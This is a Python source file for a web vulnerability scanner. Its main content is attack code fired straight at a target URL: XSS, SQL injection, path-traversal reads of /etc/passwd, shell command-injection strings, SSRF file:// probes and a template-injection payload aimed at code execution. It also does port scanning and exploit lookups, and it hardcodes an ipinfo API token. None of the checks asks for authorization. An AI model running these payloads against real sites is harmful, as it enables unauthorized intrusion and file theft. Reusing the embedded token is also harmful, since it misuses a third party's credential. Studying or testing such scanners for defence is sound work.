from Wappalyzer import Wappalyzer, WebPage
from urllib.parse import urlparse
import dns.resolver
import requests
import vulners
import base64
import socket
import json
import os

class Scanner:
    def __init__(self, params):
        self.params = params

    def full_scan(self, url):
        return {
            "checked_url": url,
            "technology": self.scan_for_technologies(url),
            "vuln": self.scan_for_vuln(url),
            "server_version": self.scan_for_server_version(url),
            "domain_information": self.domain_information(url),
            "port_discovery": self.port_discovery(url),
            "dns_record": self.dns_record(url),
            "request_tamp": self.request_tamp(url),
            "exploit_info": self.exploit_info(url),
            "mitigation_info": self.mitigation_info(url)
        }

    def scan_for_technologies(self, url):
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        res = wappalyzer.analyze_with_versions_and_categories(webpage)

        return res

    def domain_information(self,url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        IP_INFO_API = "bd9a656f7652f9"
        host = f"https://ipinfo.io/{ip}?token={IP_INFO_API}"
        headers = {
            'Content-Type':'application/json'
        }
        req = requests.get(host,headers=headers)
        info = json.dumps(req.json())

        return info

    def port_discovery(self,url):
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        for port in range(20,65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((ip,port))
            if result == 0:
                return f"Port {port} - Open"
            s.close()

    def dns_record(self,url):
        domain = urlparse(url).netloc
            
        A_RECORD = dns.resolver.query(domain,'A')

        for val in A_RECORD:
            data = json.dumps({
                'A RECORD': val.to_text()
            })

            return data

    def scan_for_vuln(self, url):
        test1 = Scanner.test_xss(url)
        test2 = Scanner.test_ssti(url)
        test3 = Scanner.test_htmli(url)
        test4 = Scanner.test_sqli(url)
        test5 = Scanner.test_lfi(url)
        test6 = Scanner.test_cmdi(url)
        test7 = Scanner.test_ssrf(url)

        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}"

    def scan_for_server_version(self, url):
        req = requests.get(url)
        headers = req.headers
        server = headers['Server']

        return server

    def request_tamp(self, url):
        return "Under Development"
    
    def exploit_info(self,url):
        req = requests.get(url)
        headers = req.headers

        server = headers["Server"]

        if server == '':
            return "No Server Version Found! Or Type!"
        else:
            VKey = self.params["v_key"] # get api key by going to https://vulners.com
            VApi = vulners.Vulners(api_key=VKey)

            search = VApi.searchExploit(server)
            search = json.dumps(search,indent=2)

            os.system(f"touch output_exploit_search.json")
            with open(f"output_exploit_search.json","w") as exploitResult:
                exploitResult.writelines(search)

            return f"Result Written To output_exploit_search.json, Access by visiting `/output`"

    def mitigation_info(self, url):
        payloadxss = "<script>document.write('xss');</script>"
        payloadssti = "{{7*7}}"
        payloadhtmli = "<h1>htmlinjection</h1>"

        reqxss = requests.get(f"{url}{payloadxss}",verify=False)
        reqssti = requests.get(f"{url}{payloadssti}",verify=False)
        reqhtmli = requests.get(f"{url}{payloadhtmli}",verify=False)

        if "xss" in reqxss.text and "49" in reqssti.text and "htmlinjection" in reqhtmli.text:
            return "SSTI,XSS, and HTMLinjection available can be prevented by reviewing the code and sanitizing the inputs"
        else:
            return "Check Through The Output"

    def test_ssti(url):
        payload1 = "{{7*'7'}}"
        payload2 = "${1000+337}"
        payload3 = "#{1000+337}"
        payload4 = "${{7*'7'}}"
        rce_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"

        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        frattempt = f"{url}{payload4}"
        
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(frattempt,verify=False)

        positive = "SSTI(Server Side Template Injection)"

        #print(req.text)
        
        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200 and req4.status_code == 200:
            if "7777777" in req1.text or '49' in req1.text:
                attempt = f"{url}{rce_payload}"
                req = requests.get(attempt,verify=False)
                if "root:x" in req.text:
                    return "SSTI + RCE"
                else:
                    return positive
            elif "1337" in req2.text:
                return positive
            elif "1337" in req3.text:
                return positive
            elif "7777777" in req4.text or '49' in req4.text:
                return positive
            else:
                return ""
        else:
            return ""

    def test_xss(url):
        fattempt = f"{url}<script>document.write('xss');</script>"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if "xss" in req.text:
                #print(req.text)
                return "XSS"
            else:
                return ""
        else:
            return ""

    def test_htmli(url):
        fattempt = f"{url}<h1 align='center' style='color:red;'>htmlinjection</h1>"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if "htmlinjection" in req.text:
                #print(req.text)
                return "HTML INJECTION"
            else:
                return ""
        else:
            return ""

    def test_sqli(url):
        payload = "' or 1=1 "
        fattempt = f"{url}{payload}"
        req = requests.get(fattempt,verify=False)
        if req.status_code == 200:
            if 'error' in req.text or 'SQL' in req.text or 'syntax' in req.text or 'PDOException' in req.text or 'SQLSTATE[' in req.text:
                #print(req.text)
                return "SQL INJECTION"
            else:
                return ""
        else:
            return ""
    """
    def test_lfi(url):
        payload1 = "../../../../../../../../../../../../etc/passwd"
        payload2 = "..//..//..//..//..//..//..//..//..//../etc/passwd"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"

        req1 = requests.get(fattempt)
        req2 = requests.get(sattempt)

        if req1.status_code == 200 and req2.status_code == 200:
            if "home/"in req1.text or "home/" in req2.status_code:
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            return ""
    """

    def test_cmdi(url):
        payload1 = "; echo 'aGVsbG8K'|base64 -d;"
        payload2 = "\necho 'aGVsbG8K'|base64 -d;"
        payload3 = "@(1000+337)"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"

        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)

        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200:
            if 'hello' in req1.text or 'hello' in req2.text:
                return "OS Command Injection"
            elif '1337' in req3.text:
                return "OS Command Injection"
            else:
                return ""
        else:
            return ""

    def test_lfi(url):
        payload1 = "../../../../../../../../../../etc/passwd"
        payload2 = "/etc/passwd"
        payload3 = base64.b64encode(payload2.encode('utf-8'))
        payload3 = str(payload3,'utf-8')
        payload4 = base64.b64encode(payload1.encode('utf-8'))
        payload4 = str(payload4,'utf-8')
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{payload3}"
        ftattempt = f"{url}{payload4}"
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(ftattempt,verify=False)
        #print(req.text)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
            if 'root' in req1.text or 'root' in req2.text or 'root' in req3.text or 'root' in req4.text:
                return "LFI(Local File Inclusion)"
            else:
                return ""
        else:
            if 'root:x:' in req1.text or 'root:x:' in req2.text or 'root:x:' in req3.text or 'root:x:' in req4.text:
                return "LFI(Local File Inclusion)"
            else:
                return ""
    
    def test_ssrf(url):
        payload1 = "file:///etc/passwd"
        payload2 = "file://\/\/etc/passwd"
        paylaod3 = "http://127.0.0.1/phpmyadmin"
        payload4 = "http://127.0.0.1/admin"
        fattempt = f"{url}{payload1}"
        sattempt = f"{url}{payload2}"
        tattempt = f"{url}{paylaod3}"
        ftattempt = f"{url}{payload4}"
        req1 = requests.get(fattempt,verify=False)
        req2 = requests.get(sattempt,verify=False)
        req3 = requests.get(tattempt,verify=False)
        req4 = requests.get(ftattempt,verify=False)
        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
            if 'root' in req1.text or 'root:x:' in req1.text or 'root:!:' in req1.text:
                return "SSRF(Server Side Request Forgery) - file"
            elif 'root' in req2.text or 'root:x:' in req2.text or 'root:!:' in req2.text:
                return "SSRF(Server Side Request Forgery) - file"
            #elif 'phpmyadmin' in req3.text or 'password' in req3.text:
            #    return "SSRF(Server Side Request Forgery)"
            #elif 'AdminLTE' in req4.text or 'password' in req4.text or 'username' in req4.text or 'login' in req4.text:
            #   return "SSRF(Server Side Request Forgery)"
            else:
                return ""
        else:
            return ""
